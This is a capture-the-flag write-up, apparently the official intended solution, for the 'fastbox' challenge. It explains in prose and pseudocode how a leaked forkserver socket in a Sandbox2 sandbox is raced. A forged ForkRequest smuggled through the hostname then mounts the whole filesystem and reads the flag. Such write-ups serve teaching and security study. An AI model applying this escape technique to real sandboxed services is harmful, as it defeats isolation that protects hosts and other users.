# Writeup for fastbox

## Challenge description

We can execute arbitrary payloads (up to 5 at a time) in a
[Sandbox2](https://developers.google.com/code-sandboxing/sandbox2) based
sandbox. The payloads are started one after another but without waiting for the
previous one to finish execution. We can have multiple payloads executing in
parallel. Additionally we can set a custom hostname for each of the payloads.

Seccomp policy only allows read/write/open/exit and mntns is empty.

## Intended solution

The challenge sets up a Sandbox2
[custom forkserver](https://developers.google.com/code-sandboxing/sandbox2/getting-started/executor#method_3_custom_forkserver_%E2%80%93_prepare_a_binary_wait_for_fork_requests_and_sandbox_on_your_own)
in an unusual way. This leads to leaking the socket fd used to receive
[fork requests](https://github.com/google/sandboxed-api/blob/6cd83d68def5e89fb2f3ea454454f08a7ea00e7e/sandboxed_api/sandbox2/forkserver.proto#L45)
into the payload.

The
[wire format](https://github.com/google/sandboxed-api/blob/6cd83d68def5e89fb2f3ea454454f08a7ea00e7e/sandboxed_api/sandbox2/comms.h)
uses Tag-Lenght-Value encoding and protos are sent in serialized form.

We cannot use the leaked fd to just send a new fork request to launch a payload
with the whole fs available. But we can read (races with read in the forkserver)
part of the original request sent to launch the next payload.

Moreover we have quite good control of part of that original request through the
hostname. The only constraint is that the hostname cannot contain '\n' (0x0A).

Crucial part is however that the forkserver needs to read the whole original
request as it expect messages that pass file descriptors to follow it. We can
either just use the suffix of the encoded proto verbatim or if needed hide it in
a string/bytes field of our "fake" ForkRequest.

### Solution in pseudocode

#### Calculate kPrefix, kSuffix

Ask to run 2 payloads:

1.  Hostname: don't care. Payload:

    ```
    char buf[128]
    kSocket = 4
    r = read(kSocket, buf, 128)
    write(1, buf, r)
    ```

2.  Hostname: a unique value. Payload: dummy (`exit(0)`/`infloop`/etc)

`kPrefix` = offset of the unique hostname in the request read by the first
payload.

`kSuffix` = len(stuff read) - kPrefix - len(unique hostname)

#### Get the Flag

Ask to run 2 payloads:

1.  Hostname: don't care. Payload:

    ```
    fd = read(kSocket, kPrefix)
    stage2_addr = &stage2
    write(fd, stage2_addr, &$RSP[return_address_offset])
    exit(0)
    ```

2.  Hostname crafted as:

    ```
    fork_request = ForkRequest()
    fork_request.clone_flags = 0x20000000 | 0x10000000 | 0x20000
    fork_request.mode = FORKSERVER_FORK
    fork_request.mount_tree.node.dir_node.outside = "/"
    fork_str = fork_request.SerializeToString()
    return p32(kTagProto2) + p64(len(fork_str)+kSuffix) + fork_str
    ```

    Payload:

    ```
    char buf[128]
    open('flag', O_RDONLY)
    read(flag, buf, 128)
    write(1, buf, 128)
    ```
